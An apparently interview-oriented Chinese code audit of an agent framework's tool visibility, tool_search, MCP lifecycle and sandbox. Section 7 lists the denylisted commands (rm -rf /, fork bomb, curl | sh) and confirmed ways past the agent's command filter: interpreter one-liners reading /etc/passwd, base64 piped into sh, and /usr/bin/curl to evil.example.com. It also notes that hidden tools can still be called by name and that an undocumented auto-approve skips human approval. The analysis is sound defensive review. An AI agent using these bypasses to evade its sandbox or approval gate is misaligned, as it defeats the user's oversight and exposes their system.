- **fallback**：`'all'` 返回全量（可能远超 maxVisibleTools）；`'none'` 只返回 pinned（progressive base 用这个）。未知值构造时抛错（`src/core/deterministic-tool-visibility.js:63`–`:67`）。
- **topK**：只在 `catalog.length > maxVisibleTools` 且存在正分命中时生效；`rankTools` 内部按分数 + 注册顺序排序（`src/core/tool-ranking.js:19`–`:20`）。文档也承认 Top-K 不是最终 schema 数上限（`ARCHITECTURE.zh-CN.md:156`）。
- **生产未启用 pinned**：`createToolRoutingFromEnv` 与 `src/index.js` 都没有传 `alwaysVisible`，默认 `[]`（`src/core/tool-visibility-config.js:27`–`:47`；`src/index.js:41`–`:46`）。“pinned 工具”只在测试 / 手工构造时存在（`test/deterministic-tool-visibility.test.js:86`–`:131`）。这是文档与生产 wiring 的一个不一致点。
- **小 catalog 短路 vs 文档**：`ARCHITECTURE.zh-CN.md:154` 写 Progressive “基础词法选择在无匹配时只保留 pinned 工具”；代码 `:25` 在 `catalog.length <= maxVisibleTools` 时直接返回全量，fallback 根本不执行。测试明确覆盖 `progressiveBase(maxVisibleTools=2)` + 2 个工具 + 无匹配 → 返回全部（`test/deterministic-tool-visibility.test.js:18`–`:27`）。

### 4.5 “可见性 ≠ 授权”在代码上的体现
- LLM 只收到 `catalogSnapshot.view(visibleNames).schemas()`（`src/core/agent-loop-runtime.js:137`、`:169`）。
- 工具调用执行直接走 `this.tools.execute(call.name, call.arguments, ...)`（`:264`），`ToolRuntime.execute` 只按 name 查注册表，没有任何“是否可见”检查（`src/core/tool-runtime.js:100`–`:103`）。
- 测试构造：visibility 第一步只给 `['tool-a']`，但 `tool-a` 的 execute 内部直接 `harness.tools.execute('tool-b', {})`，`tool-b` 不可见却执行成功且 `isError=false`；最终统计 `hiddenExecutions=1`（`test/tool-visibility.test.js:44`–`:57`、`:138`–`:139`）。
- CLI `/tools` 也直接列 `ctx.tools.list()`，即注册集合而不是当前可见集合（`src/plugins/cli.js:166`–`:176`）。
- 设计理由（文档明确）：Visibility 只控制本次请求的 schema 开销，授权由工具与 policy 负责（`docs/DESIGN_DECISIONS.zh-CN.md:35`–`:40`；`ARCHITECTURE.zh-CN.md:160`）。
- 推论：隐藏的 MCP 工具如果已经注册，模型只要按名字调用仍会执行；真正的访问控制必须在 ToolRuntime 执行层 / policy / approval 实现，当前代码没有。
---

## 5. `tool_search`：搜索范围、激活机制、每 Run 隔离

### 5.1 注册与依赖
- 插件 `mini-tool-search`，只 `inject = ['tools']`（`src/tools/tool-search.js:3`–`:4`），不依赖 `mcp`。
- 常量：工具名 `TOOL_SEARCH_NAME='tool_search'`，默认返回上限 `DEFAULT_TOOL_SEARCH_LIMIT=5`，schema 上限 `MAX_TOOL_SEARCH_LIMIT=8`，描述截断 `MAX_DESCRIPTION_LENGTH=160`（`:5`–`:8`）。
- `apply` 要求传入 `toolCatalog.snapshot()` 与 `activationStore.activate()`，否则抛错（`:10`–`:17`）；这解释了为什么它只能和 progressive wiring 一起用。
- 用 `ctx.effect(() => ctx.tools.register({...}), 'tool search Tool')` 注册，disposer 保证插件卸载时工具被移除（`:18`–`:64`）。
- 工具 schema：`query` 必填，`limit` 为 `integer`、`minimum:1`、`maximum:8`、`additionalProperties:false`（`:24`–`:36`）。
- 生产入口只有在 `routing.activationStore` 存在（即 `MINI_DSH_TOOL_ROUTING=progressive`）时才注册该插件（`src/index.js:41`–`:46`）。在 All / Deterministic 模式下没有 `tool_search` 工具；模型若调用会得到 `unknown_tool`（`src/core/tool-runtime.js:100`–`:110`）。

### 5.2 搜索范围：执行时的完整已注册 catalog
`execute({query, limit=5}, execution)`（`src/tools/tool-search.js:37`–`:60`）：
- `catalog = toolCatalog.snapshot().list().filter(tool => tool.name !== TOOL_SEARCH_NAME)`（`:38`–`:41`）。
  - “完整”指 **执行那一刻** 的 `ctx.tools.list()`；工具运行期间动态注册的工具会被看到（ToolCatalog.snapshot 每次调用实时读 `tools.list()`，`src/core/tool-catalog.js:9`–`:12`）。
  - 它包含当前不可见但已注册的工具（这正是 progressive 的用途），也包含已连接的 MCP 客户端注册进来的工具。
  - 它显式排除 `tool_search` 自己（`:41`）；文档说“搜索当前完整已注册 Catalog”，严格说少了 self-exclusion 这个细节。
- `matches = rankTools(catalog, query).slice(0, limit)`（`:42`）；复用 `src/core/tool-ranking.js` 的词法排序。
- 返回 `matches` 只含 `{name, description}`，描述用 `shortDescription()` 截到 160 字符（`:48`–`:55`、`:67`–`:71`）；不返回 parameters / schema（测试 `test/progressive-tool-search.test.js:69`–`:72`）。
- 因只读 catalog，不存在“搜索时顺手 connect MCP”的路径；它没有 import / inject `mcp`（`:4`），`McpManager.connect` 只由 `ctx.mcp` 服务或 `/mcp connect` 显式调用（`src/plugins/mcp.js:28`–`:30`；`src/plugins/cli.js:122`–`:136`）。

### 5.3 激活机制：命中后写入当前 Run 的 activation store
- 命中名字后调 `activationStore.activate(execution.runId, matches.map(name))`（`:43`–`:46`）。
- `ToolActivationStore`（`src/core/tool-activation-store.js`）：
  - `#activations` 是 `Map<runId, Set<name>>`（`:4`）；
  - `activate(runId, names)` 校验 runId 非空字符串、names 字符串数组（`:14`–`:18`）；
  - 去重、已激活的进 `alreadyActivated`、超出 `maxActivatedTools` 的进 `limitReached`、其余进 `activated`（`:20`–`:36`）；
  - 默认 `maxActivatedTools=24`（`:1`），由 `MINI_DSH_MAX_ACTIVATED_TOOLS` 配置（`src/core/tool-visibility-config.js:17`–`:21`、`:38`）。
- 返回体含 `matches / activated / alreadyActivated / notActivatedDueToLimit / message`（`src/tools/tool-search.js:48`–`:59`）；有超限项时 `message='activation limit reached'`。
- 下一步 `ProgressiveToolVisibility.select` 会把 `activationStore.names(runId)` 中仍在当前 catalog 的名字加入可见集（`src/core/progressive-tool-visibility.js:20`–`:22`）。因此工具不需要每步重新搜索；重复搜索也不会消耗额外槽位（`alreadyActivated`，测试 `test/progressive-tool-search.test.js:141`–`:174`）。
- `limit` 与 `maxActivatedTools` 是两回事：`limit` 限制本次返回 / 激活尝试数量（默认 5，schema 最大 8）；`maxActivatedTools` 限制该 Run 累计可激活的工具数（默认 24）。超出 schema 的 `limit`（如 9）会在 Ajv 校验层得到 `invalid_arguments`（`src/core/tool-runtime.js:123`–`:130`）。

### 5.4 每 Run 隔离与清理
- `ToolActivationStore` 的所有方法都以 `runId` 为 key（`:20`、`:39`、`:43`）。
- `ProgressiveToolVisibility.beginRun/endRun` 都调用 `activationStore.clear(runId)`（`src/core/progressive-tool-visibility.js:26`–`:32`）；AgentLoop 在 run 开始和 finally 中调用，且异常 fail-open（`src/core/agent-loop-runtime.js:93`、`:414`–`:419`）。
- 测试证据：
  - 两个并发 run 分别激活不同工具，互不串（`test/progressive-tool-search.test.js:93`–`:139`）；
  - run 结束后 `activationStore.names(runId)` 为空（`:303`–`:311`）；
  - 已从 catalog 移除的 stale activation 不会继续暴露，`ProgressiveToolVisibility.select` 用 `currentNames` 过滤（`:176`–`:192`）。
- 注意：stale 名字虽然不暴露，但仍留在 activation set 里并占用 `maxActivatedTools` 容量，直到 `clear(runId)`；`ToolActivationStore` 没有“工具注销时按名删除”的 API（`src/core/tool-activation-store.js:39`–`:45`）。

### 5.5 为什么不会懒加载连接 MCP
- `tool_search` 只依赖 `ToolCatalog.snapshot()`，而 ToolCatalog 只是 `ctx.tools.list()` 的只读快照（`src/core/tool-catalog.js:9`–`:12`）；它没有能力启动 MCP 连接。
- MCP 连接入口只有 `McpManager.connect`，通过 `ctx.mcp.connect` 暴露给 CLI / 插件（`src/core/mcp-manager.js:65`–`:70`；`src/plugins/mcp.js:28`–`:30`）。`tool_search` 没有 import 或 inject 这个服务。
- 因此：
  - `DISCONNECTED` 的 server 的工具没有注册进 `ctx.tools`，搜索不到；
  - 搜索是确定性、离线、无网络副作用的；MCP 连接是显式生命周期操作（`/mcp connect`）；
  - 如果搜索会隐式连接，它就会变成可能阻塞 / 失败 / 产生远端副作用的网络操作，破坏“搜索只是 catalog 查询”的边界。
- MCP 注销时工具会从 `ctx.tools` 移除，测试验证 `mcp__fake__echo` 在 disconnect 后 `undefined`（`test/mcp-manager.test.js:441`–`:458`）。

### 5.6 限制与坑
- 纯词法：中文 query 没有 `[a-z0-9]` token，`rankTools` 返回空（`src/core/tool-ranking.js:9`–`:11`、`:23`–`:31`）。progressive 端到端测试里的中文用户输入其实由模型把搜索词改写成英文 `github issues`（`test/progressive-tool-search.test.js:242`–`:250`、`:293`–`:299`）。
- 只返回截断 description，不返回参数 schema；模型凭短描述决定是否激活，可能误判。
- stale activation 占容量（见 5.4）。
- 激活生命周期绑定 **Agent Run**，不是 Session；run 结束即清空，跨 run 不保留。长任务需要在一个 run 内完成搜索和后续调用。
- 与“可见性 ≠ 授权”一致：不搜索 / 不可见的已注册工具，模型仍可直接按名字调用（`src/core/agent-loop-runtime.js:264`；测试 `test/tool-visibility.test.js:44`–`:57`）。
---

## 6. MCP：McpManager 的串行化、状态机与清理语义

### 6.1 职责边界与状态机
- `MCP_STATES`：`DISCONNECTED / CONNECTING / ACTIVE / FAILED`（`src/core/mcp-manager.js:1`–`:6`）。
- 类注释明确：`McpManager` 只“拥有 MCP 插件实例”，不实现 MCP 协议；注入的 `activate` 是唯一生命周期桥（`:10`–`:13`）。
- 状态转换：
  - `register` 新记录初始 `DISCONNECTED`（`:27`–`:42`）。
  - `connect`：`#connectUnlocked` 若 state 已是 `ACTIVE` 直接返回 snapshot（幂等，`:155`）；若已有 `fiber`，先 `#disconnectUnlocked`（`:157`）；置 `CONNECTING`（`:159`）；`await #activate(definition)` 并校验返回对象有 `dispose()`（`:162`–`:165`）；成功置 `fiber` + `ACTIVE`（`:166`–`:168`）；失败置 `fiber=null`、`FAILED`、保存 `lastError` 并 rethrow（`:169`–`:174`）。
  - `disconnect`：没有 fiber 时直接 `DISCONNECTED` 并清空错误（`:177`–`:183`）；有 fiber 时 `await fiber.dispose()`，成功清空 fiber / 置 `DISCONNECTED / lastError=null`（`:184`–`:188`）；失败保留 fiber、置 `FAILED / lastError` 并 rethrow（`:189`–`:193`）。
  - `reload`：在同一个队列槽里先 `#disconnectUnlocked` 再 `#connectUnlocked`（`:79`–`:87`）。
- 插件桥 `activatePlugin`（`src/plugins/mcp.js:59`–`:72`）：`import(definition.package)` → `ctx.plugin(mod, definition.config)` → `await fiber` → 返回 `{dispose: () => fiber.dispose()}`。若中途失败，且 fiber 已创建，会先 `fiber.dispose().catch(()=>{})` 再 rethrow（`:68`–`:71`），避免半激活插件泄漏。

### 6.2 connect / disconnect / reload 的串行化
- `#enqueue(record, operation)`（`src/core/mcp-manager.js:138`–`:148`）：
  - `previous = record.tail ?? Promise.resolve()`；
  - `current = previous.catch(() => {}).then(operation)`：**前一个操作失败不会毒化队列**（`:140`）；当前调用仍会收到自己的 rejection；
  - `tail = current.catch(() => {})` 存回 `record.tail`，保证后续排在上一个之后；
  - `current.then(cleanup, cleanup)`：当且仅当 `record.tail` 还是自己的 tail 时清空，避免清掉后来者（`:150`–`:152`）。
- `connect/disconnect/reload` 都通过 `#enqueue`（`:69`、`:76`、`:83`–`:86`），因此**同一个 server 生命周期操作 FIFO**；不同 server 各自一条 tail，天然并发（`:138` 的 record 仍是 per-server）。
- 测试证据：
  - connect 排在 disconnect 后，FIFO 且最终 ACTIVE（`test/mcp-manager.test.js:122`–`:154`）；
  - 同一 server 的 connect/disconnect 严格串行（`:284`–`:304`）；
  - 不同 server 可以并发（`:306`–`:323`）；
  - 一个 server 失败不影响另一个（`:325`–`:341`）。

### 6.3 activation 失败清理
- `#activate` 返回空 / 没有 `dispose` → 抛 `TypeError('MCP activator must return { dispose() }')`，`#connectUnlocked` catch 后置 `FAILED`（`src/core/mcp-manager.js:162`–`:174`）。
- Cordis 桥在 `ctx.plugin` 抛错时会 dispose 部分创建的 fiber（`src/plugins/mcp.js:68`–`:71`）。
- 测试：`failing-mcp-plugin` 先注册 `mcp__broken__partial` 再抛错，最终 state FAILED 且工具被清理（`test/mcp-manager.test.js:460`–`:475`）；activation 第一次失败后再次 connect 可重试（`:156`–`:172`）。

### 6.4 disconnect 失败重试
- 失败时**保留 `record.fiber`** 且置 `FAILED`（`src/core/mcp-manager.js:189`–`:193`），所以下一次 disconnect / connect / reload / unregister / dispose 会再次调用同一个 fiber 的 `dispose()`。
- 测试：第一次 dispose 抛错 → state FAILED / lastError；第二次 disconnect 成功 → DISCONNECTED / lastError=null，累计 dispose 调用 2 次（`test/mcp-manager.test.js:174`–`:193`）。
- `reload` 在旧 fiber 清理失败时不会激活新 fiber（测试 `:204`–`:221`）。
- 有旧 fiber 时 `connect` 会先清理，清理失败则不创建新 fiber（测试 `:223`–`:244`）。
- `unregister(name)`：设 `record.removing=true`，然后把 disconnect 入队；失败则把 removing 复位并 rethrow，记录保留；成功且记录未被替换才从 Map 删除（`src/core/mcp-manager.js:103`–`:115`）。`#assertNotRemoving` 会拒绝正在移除的 server 的 connect/disconnect/reload（`:209`–`:212`；测试 `:246`–`:272`）。

### 6.5 dispose：all-settled 清理与可重试
- `dispose()` 幂等：已 disposed 直接返回；已有 `#disposePromise` 返回同一个 promise（`src/core/mcp-manager.js:117`–`:119`）。
- 对当前所有 record 并行 `Promise.allSettled` 做 enqueue-disconnect（`:121`–`:124`）；只要有 rejected，就 `throw failure.reason`，**不清空 records、不置 disposed**（`:125`–`:126`）。
- `this.#disposePromise` 由 `shutdown.catch(...)` 包装：失败时把自己重置为 null（`:131`–`:134`），所以之后可以再次调用 dispose 重试（已成功的 server 因 fiber 已 null，第二次是 no-op）。
- 测试：
  - server-a 成功、server-b 第一次失败 → dispose reject，list 仍有 2 条，server-b 为 FAILED；第二次 dispose 成功，list 清空（`test/mcp-manager.test.js:375`–`:408`）；
  - 并发 dispose 共享同一个 promise / 只清理一次（`:410`–`:439`）；
  - dispose 中 / 后 register、connect、reload 被 `#assertOpen` 拒绝（`:203`–`:207`；测试 `:406`–`:407`、`:430`–`:432`）。
- 插件侧注册了两条清理路径：`McpService.dispose()`（`src/plugins/mcp.js:40`–`:42`）和 `ctx.effect(() => () => manager.dispose(), 'mcp manager')`（`:46`）。由于 manager 幂等，双路径安全；测试 `test/mcp-manager.test.js` 的 mcp 插件 fixture 也依赖这个。

### 6.6 为什么 `ACTIVE ≠ remote endpoint healthy`
- `ACTIVE` 只在 `#connectUnlocked` 中、本地 `#activate` 成功返回 `{dispose}` 后设置（`src/core/mcp-manager.js:162`–`:168`）；state 不会因远端请求失败、断网、server 重启而自动变化。
- `#connectUnlocked` 对已是 `ACTIVE` 的请求直接返回 snapshot，不做 ping / health check（`:155`）。
- manager 里没有 heartbeat、重连、远端 enumerate tools 逻辑；这些由 `@deepseek-ai/dsh-mcp-client`（package.json 依赖 `0.1.1-rc.2`）负责（`ARCHITECTURE.zh-CN.md:192`–`:208`；`README.zh-CN.md:97`–`:105`）。
- 后果：`ACTIVE` 时工具最初已注册，但具体调用可能因远端不可用而失败；失败会作为 Tool Result 回到 loop，不会把 MCP state 改成 FAILED。
- 未验证：`@deepseek-ai/dsh-mcp-client` 内部在“本地 fiber 激活成功但远端首次连接失败”时的具体行为；本报告只读了 mini-dsh 的调用契约（`src/plugins/mcp.js:59`–`:72`），未读该外部包源码。

### 6.7 快照、脱敏与错误传播
- `snapshot(record)` 只输出 `name / package / autoStart / state / lastError`，不输出 config（`src/core/mcp-manager.js:249`–`:257`）；`lastError` 通过 `errorSnapshot → redactText` 对 authorization / api key / token / secret / password 做掩码（`:259`–`:271`）。测试断言 public JSON 不包含敏感值（`test/mcp-manager.test.js:36`–`:86`）。
- 但 `connect/disconnect/reload` 抛给调用方的仍是**原始 error**（`src/core/mcp-manager.js:173`、`:192`），`dispose` 抛出的是 `failure.reason` 原始错误（`:126`）；redaction 只覆盖 snapshot。CLI 在操作失败时优先打印 `status.lastError?.message`（已脱敏，`src/plugins/cli.js:128`–`:133`），所以 CLI 路径通常安全；**程序化调用方**若直接打印 error，可能看到未脱敏的密钥。这是一个可以主动指出的边界。
- `normalizeDefinition` 会强制 `config.serverName = name`，若 config 里显式给了不同的 `serverName` 直接抛错（`:215`–`:247`）；`autoStart` 必须是 boolean（`:222`–`:224`）。
- `register` 返回的 unregister 闭包只执行一次（`unregistering` 缓存），重复调用返回同一个 promise（`:44`–`:53`）。

### 6.8 与工具注册的关系
- 官方 MCP 客户端插件在 fiber 激活期间通过 `ctx.tools.register()` 注册远端工具；`disconnect` 时 fiber.dispose 触发工具 disposer，从 ToolRuntime 移除。
- 测试：connect 后 `ctx.tools.get('mcp__fake__echo')` 存在，disconnect 后为 undefined（`test/mcp-manager.test.js:441`–`:458`）。
- 这解释了“已发送 schema 可能在执行前失效”：第 N 步请求里带了某 MCP 工具 schema，第 N+1 步 disconnect 后模型若仍调用它，ToolRuntime 返回 `unknown_tool`（`src/core/tool-runtime.js:100`–`:110`）。`ARCHITECTURE.zh-CN.md:208` 也明确描述了这一契约。
---

## 7. Sandbox：路径校验、命令策略、人工审批与应用层边界

### 7.1 三闸门定位
`SandboxRuntime` 的类注释直接给出设计观（`src/core/sandbox-runtime.js:45`–`:76`）：
1. **路径 gate**（`utils/path.js`）：allowlist 形状，最强；resolve 后要求 workspace 前缀，做两次（词法一次、realpath 一次），静态 symlink 逃逸兜住。
2. **命令策略**：denylist，阻止明显的 `rm -rf /`、`sudo`、写系统路径、`curl | sh`；只提高误操作成本，不构成攻击边界；“anything that reaches a second interpreter walks straight past it”。
3. **人工审批 (`approve`)**：写文件与 bash 执行先 `[Y/n]`；这是实际权限边界。

相关常量：系统路径前缀、系统 bin 前缀、允许设备、shell wrappers、默认允许 host（`localhost / 127.0.0.1 / ::1 / 0.0.0.0`）（`src/core/sandbox-runtime.js:4`–`:43`）。

`SandboxRuntime`（`:77`–`:132`）：
- 构造：`workspace = path.resolve(workspace ?? process.cwd())`、`autoApprove`、`allowHosts` 默认 local（`:80`–`:84`）。
- `resolvePath()` 直接走 `resolveInside`（`:86`–`:88`）。
- `inspectCommand()` / `assertCommand()`：inspect 返回 `{action:'allow'|'deny', reason}`；deny 时 `assertCommand` 抛 `sandbox denied: ...`（`:90`–`:103`）。
- `setApprover(fn)` 返回 disposer；`approve(request)`：autoApprove 直接 `{approved:true, source:'auto'}`；没有 approver 抛“write requires user approval, but no approval channel is set”；approver 返回 falsy 抛 “user rejected this operation”（`:109`–`:131`）。

插件层（`src/plugins/sandbox.js`）：
- `workspace` 取 `config.workspace ?? MINI_DSH_WORKSPACE ?? process.cwd()`；`autoApprove` 取 `config.autoApprove ?? MINI_DSH_AUTO_APPROVE === '1'`（`:13`–`:17`）。
- 包装为 `ctx.sandbox`，暴露 `workspace / resolvePath / inspectCommand / assertCommand / approve / setApprover`（`:19`–`:43`）。
- 注册 system prompt sandbox 段，声明 workspace 边界、危险命令被阻止、写与 bash 需要用户批准（`:47`–`:61`）。

### 7.2 路径 gate（内置文件工具唯一入口）
`resolveInside(workspace, requested)`（`src/utils/path.js:58`–`:78`）：
- requested 必须是 string；含 NUL 直接抛错（`:59`–`:66`）。
- `root = path.resolve(workspace)`、`target = path.resolve(root, requested)`；先做**词法**包含检查 `isInside(root, target)`（`:68`–`:72`）。
- 再做**真实路径**包含检查：`isInside(resolveLinks(root), resolveLinks(target))`（`:73`–`:77`）。
- 返回的是**词法 target**，不是 realpath（`:54`–`:57`、`:78`）；理由：错误信息与工具输出保持用户输入的路径形态，避免 macOS `/tmp → /private/tmp` 之类。
`isInside` 用 `path.relative` 判断：`relative === ''` 或 `relative` 不以 `..` 开头且不是绝对路径（`:10`–`:18`）。注释特别解释不能用 `startsWith('..')`，否则会误杀 workspace 内名为 `..hidden` 的文件（`:4`–`:9`）。
`resolveLinks` 解析“最长存在前缀”的 symlink，再把不存在的尾部拼回；这样“写一个还不存在的文件”也能检查 symlink 父目录（`:20`–`:40`）。
测试：`..`、绝对路径、`src/../../etc/passwd` 被拒；`..hidden` 放行（`test/core.test.js:428`–`:438`）；workspace 内 symlink 指向 `/tmp` 时，`escape/passwd` 和还不存在的 `escape/not-created-yet` 都被拒（`:441`–`:454`）。
限制：检查与真正的 `fs` 操作是两个时刻，存在 TOCTOU；文档也承认“检查后文件系统变化不由这些检查完整约束”（`ARCHITECTURE.zh-CN.md:250`）。

### 7.3 命令策略的实现细节
`inspectCommand(command, ctx, depth)`（`src/core/sandbox-runtime.js:138`–`:188`）按以下顺序检查，任一命中立刻 `deny`：
1. 非空 string；`depth > 5` 报“command nesting is too deep”（`:139`–`:142`）。
2. fork bomb 正则 `{ :|:& }`（`:146`–`:148`）。
3. `sudo | su`：只在命令起始或 `; & | \n` 后匹配（`:150`–`:152`）。
4. `shutdown / reboot / halt / poweroff` 或 `init 0/6`（`:154`–`:156`）。
5. `mkfs.*` 或 `dd ... of=/dev/...`（`:158`–`:160`）。
6. 递归删除 `rm -r / rm -rf`：`isRecursiveRm(tokenize(text))`（`:162`–`:166`；实现见 `:190`–`:205`，识别 `--recursive`、`--no-preserve-root`、含 `r/R` 的短选项）。
7. `curl/wget` 管道进 shell：`inspectPipedDownload`（`:168`–`:169`；实现 `:207`–`:216`，覆盖 `curl ... | sh`、`curl ... | bash`、`sh <(curl ...)`）。
8. 命令替换递归：`extractSubstitutions` 提取 `$(...)` 和反引号内容，再递归 inspect（`:171`–`:174`；实现 `:218`–`:223`）。
9. wrappers：`eval` 的剩余参数、shell wrapper（`bash/sh/zsh/dash/ksh`）的 `-c` 参数递归 inspect（`:178`–`:179`；实现 `:225`–`:243`；`SHELL_WRAPPERS` 在 `:41`）。
10. 网络策略 `inspectNetwork(tokens, ctx)`（`:181`–`:182`；实现 `:245`–`:327`）：
    - 只对 token 恰好等于 `curl` / `wget` 的命令生效（`:266`）；
    - flag `--key=value` 检查 value（`:271`–`:275`）；
    - 已知取值 flag（`-o/--output/-T/--upload-file/-K/--config/--unix-socket/-x/--proxy/...`）跳过下一个 token 作为值检查（`:245`–`:262`、`:277`–`:285`）；
    - `file:` URL 必须落在 workspace（`:295`–`:303`）；
    - 带 scheme 的 URL 先 `extractHost`，host 必须在 allowHosts（`:305`–`:311`、`:440`–`:449`、`:471`–`:474`）；
    - 裸 hostname / IP 也要检查（`:313`–`:315`、`:451`–`:459`、`:461`–`:469`）；
    - 看起来像路径的参数走 `expandPathToken` + `resolveInside`（`:317`–`:325`）。
11. 路径 token 策略 `inspectPathTokens(tokens, workspace)`（`:184`–`:185`；实现 `:329`–`:358`）：
    - `looksLikePath`：含 `/`、`\`、`.`、`..`、`~`、以 `.` 开头、含环境变量（`:380`–`:392`）；
    - 环境变量 / `~` 先展开；**未定义环境变量直接拒绝**，因为无法验证（`:424`–`:438`、`:335`–`:338`）；
    - 命令位置（第一个 token 或紧跟在 separator 后）且是系统二进制（`/bin/`、`/usr/bin/` 等）则放行（`:340`–`:341`、`:400`–`:405`）；
    - 否则 `resolveInside`；失败后检查允许设备、系统路径（deny）、包含 `..`（deny）、其他逃逸（deny）（`:342`–`:355`、`:394`–`:398`、`:407`–`:412`）。
12. 全部通过返回 `{action:'allow'}`（`:187`）。
`tokenize` 用正则保留引号整体、剥离外层引号、把 `;&|` 单独成 token（`:360`–`:374`）；`isSeparator` 判 `^[;&|]+$`（`:376`–`:378`）。

测试覆盖：`rm -rf /`、`sudo`、shutdown、`mkfs`、fork bomb、`curl | sh`、系统路径写入、path 逃逸等（`test/core.test.js:462`–`:510` 附近）。测试还验证 allowlist host 与 `autoApprove` 行为（`:514`–`:534`）。

### 7.4 人工审批 `[Y/n]` 在哪里触发
- **bash**：`execute` 先 `ctx.sandbox.assertCommand(command)`，再 `await ctx.sandbox.approve({tool:'bash', kind:'bash', summary:'bash: '+command, command})`，通过后才 `runBash`（`src/tools/bash.js:37`–`:56`）；`runBash` 用 `spawn('bash',['-lc',command],{cwd:workspace, env:process.env, stdio:...})`（`:59`–`:67`）。
- **write_file**：resolvePath 后计算 `rel`，`await ctx.sandbox.approve({tool:'write_file', kind:'write', summary:'write_file <rel> (<bytes> bytes)', path:rel})`，通过后 mkdir + writeFile（`src/tools/files.js:36`–`:47`）。
- **edit_file**：同样先 approve（`summary:'edit_file <rel>'`），通过后读文件、检查 oldText 唯一、再写回（`src/tools/files.js:67`–`:83`）。
- **read_file / glob / grep 不触发审批**（`src/tools/files.js:12`–`:22`、`:87`–`:116`）。
- CLI 通过 `ctx.sandbox.setApprover((request) => askApproval(rl, request))` 注册审批通道，并在等待审批时暂停 `running` 状态（`src/plugins/cli.js:66`–`:72`）。`askApproval` 打印 `[Approval] <summary>`，问题 `Allow this? [Y/n] `，空串 / `y` / `yes` 视为通过，其他视为拒绝并打印红色 rejected（`:308`–`:320`）。
- `autoApprove=true`（`config.autoApprove` 或 `MINI_DSH_AUTO_APPROVE=1`）直接跳过人工；没有 approver 且未 autoApprove 时抛错，而不是默认放行（`src/core/sandbox-runtime.js:116`–`:131`；`src/plugins/sandbox.js:13`–`:17`）。
- 文档/`.env.example` 没有列出 `MINI_DSH_AUTO_APPROVE`，但代码支持；CLI 启动提示仍写“Writes and bash execution ask [Y/n] first”（`src/plugins/cli.js:51`）。这是一个需要主动说明的“文档漏了旁路”。

### 7.5 为什么只是应用层策略，不是 OS 隔离
- 类注释自己承认：不是 kernel isolation、不是 seccomp、不是 container；denylist 天然不完整；二级解释器直接绕过（`src/core/sandbox-runtime.js:45`–`:76`）。
- `runBash` 只是 `spawn('bash', ['-lc', command])`，继承 `process.env`，没有 namespace / chroot / seccomp / cgroup / 只读挂载（`src/tools/bash.js:62`–`:66`）。
- 路径 gate 只包住内置文件工具的 `resolvePath`（`src/tools/files.js:21`、`:37`、`:68`）；`bash`、外部插件、MCP 远端工具都不受这条路径 gate 约束。
- 命令策略只对 `bash` 工具的输入调用（`src/tools/bash.js:40`）；其他执行路径完全没有统一的 `assertCommand` 入口。
- 我做了只读的本地 `inspectCommand` 实验（未改仓库），确认以下具体绕过：
  1. `python3 -c 'open("/etc/passwd").read()'`、`node -e 'require("fs").readFileSync("/etc/passwd")'` → `allow`。原因是 `tokenize` 把整段带引号参数当作一个 token（`:360`–`:374`），`resolveInside` 把 `open("/etc/passwd")` 当成 workspace 内的相对路径（`:342`–`:343`），不会识别里面的绝对路径。
  2. `echo aGVsbG8= | base64 -d | sh` → `allow`。`inspectPipedDownload` 只看 curl/wget，`inspectWrappers` 只看 shell `-c` / `eval`，管道进 `sh` 没有 `-c` 参数（`:207`–`:243`）。
  3. `/usr/bin/curl http://evil.example.com/x` → `allow`，而 `curl http://evil.example.com/x` → deny。因为 `inspectNetwork` 只匹配 token 恰好为 `curl`/`wget`（`:266`），而命令位置的 `/usr/bin/curl` 被 `inspectPathTokens` 当作合法系统二进制放行（`:340`–`:341`），后面的 URL 又被 `inspectPathTokens` 的 scheme 跳过（`:332`–`:333`）。
- 因此正确的面试表述：路径 gate 是“较强的应用层闸门”，命令策略是“提高事故成本”，人工审批才是权限边界；不提供对恶意代码、二级解释器、MCP 远端执行的隔离。
- 另一个 wiring 限制：`SandboxRuntime` 支持 `allowHosts`（`:80`–`:84`），但 `src/plugins/sandbox.js:13`–`:17` 没有把 `config.allowHosts` 传进去，生产只能使用内置默认 host 集合（`:43`）。文档没有说明这个不可配置点。
---

## 8. SystemPromptRuntime（task 清单内，顺带核对）

- `SystemPromptRuntime` 维护两个 `Map`：`#sections` 与 `#contexts`（`src/core/system-prompt-runtime.js:9`–`:10`）。
- `section(item)` / `context(item)` 都走 `#register`：要求 `item.name` 非空，重名直接抛错；默认 `order=0`；返回一个幂等 disposer，只有当前存储里的对象仍是自己时才删除（`:12`–`:37`）。
- `assemble(assembleContext)`（`:39`–`:52`）：
  - entries = sections 然后 contexts，合并后按 `order` 升序排序（`:41`–`:43`）；
  - 每项 `text` 可以是字符串或 async factory，`await item.text(assembleContext)`（`:47`–`:48`）；
  - `text?.trim()` 为空则跳过；否则 `trim()` 后以 `'\n\n'` 拼接（`:49`–`:51`）。
- `inspect()` 返回 sections / contexts 的 `{name, order}` 列表（`:54`–`:59`）。
- AgentLoop 每个 Step 调 `systemPrompt.assemble({agent, sessionId, step})`，然后可选拼接 progress reminder（`src/core/agent-loop-runtime.js:116`–`:126`）。
- Sandbox 插件用 order 15 注册一段 `sandbox:policy`（`src/plugins/sandbox.js:47`–`:61`）。
- 细节：`Array.prototype.sort` 在 ES2019+ 稳定；同样 order 时先出现的是 sections（因为 entries 是 sections 在前），然后是 contexts。若两个 section 的 order 相同，注册顺序决定先后。
- 未验证：如果某个 `text` factory 抛错，`assemble` 没有局部 try/catch（`src/core/system-prompt-runtime.js:47`–`:48`），异常会冒泡到 AgentLoop 的 step 级 catch，最终可能以 `internal_error` 结束；没有看到专门覆盖这个场景的单测。

---

## 9. 文档与代码不一致 / 夸大点（面试时主动交代）

> 总体判断：`ARCHITECTURE.zh-CN.md` / `README.zh-CN.md` 对限制的表述相当克制，很多“夸张”风险它们已经自己写了。以下是逐条核对后仍值得点名的差异。

1. **Progressive “无匹配只留 pinned” 对小 catalog 不成立**（偏高严重度，容易在追问中翻车）。
   - 文档：`ARCHITECTURE.zh-CN.md:154` “基础词法选择在无匹配时只保留 pinned 工具”。
   - 代码：`DeterministicToolVisibility.select` 先判断 `catalog.length <= maxVisibleTools`，直接返回全量，永远不会走 fallback（`src/core/deterministic-tool-visibility.js:25`）。
   - 测试明确覆盖：`progressiveBase(maxVisibleTools=2)` + 2 个工具 + 无匹配 → 全量（`test/deterministic-tool-visibility.test.js:18`–`:27`）。
   - 修正说法：只有在 `catalog.length > maxVisibleTools` 时，progressive 的 no-match 才只留 pinned。

2. **pinned（alwaysVisible）在生产 wiring 中从未启用**（中等）。
   - 文档：`ARCHITECTURE.zh-CN.md:153`、`:156` 把 pinned 当作选择算法的一部分。
